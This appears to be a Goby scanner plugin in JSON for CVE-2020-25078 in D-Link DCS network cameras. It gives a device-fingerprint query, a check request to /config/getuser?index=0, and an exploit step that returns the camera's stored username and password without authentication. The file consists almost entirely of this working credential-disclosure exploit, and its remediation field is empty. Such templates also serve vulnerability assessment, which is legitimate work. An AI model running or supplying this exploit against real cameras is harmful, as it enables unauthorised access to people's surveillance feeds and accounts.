{
      "Name": "D-Link DC Disclosure of account password information (CVE-2020-25078)",
      "Level": "2",
      "Tags": [
            "Disclosure of Sensitive Information"
      ],
      "GobyQuery": "app=\"DLink-Network-Camera\"",
      "Description": "Account and password information disclosure D-Link DCS series monitoring obtains account and password information by accessing a specific URL, and attackers can access the video monitoring page by entering the background through the vulnerability",
      "Product": "D-Link DC ",
      "Homepage": "http://www.dlink.com.cn/",
      "Author": "PeiQi",
      "Impact": "<p>Attackers can access video monitoring page by loopholes into the backgroun<br></p>",
      "Recommandation": "",
      "References": [
            "http://wiki.peiqi.tech"
      ],
	  "HasExp": true,
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/config/getuser?index=0",
                        "follow_redirect": true,
                        "header": {},
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "name",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "pass",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
	  "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/config/getuser?index=0",
                        "follow_redirect": true,
                        "header": {},
                        "data_type": "text",
                        "data": ""
                  },
                  "SetVariable": [
					"output|lastbody"
				  ]
            }
      ],
      "PostTime": "2021-04-04 21:23:30",
      "GobyVersion": "1.8.255"
}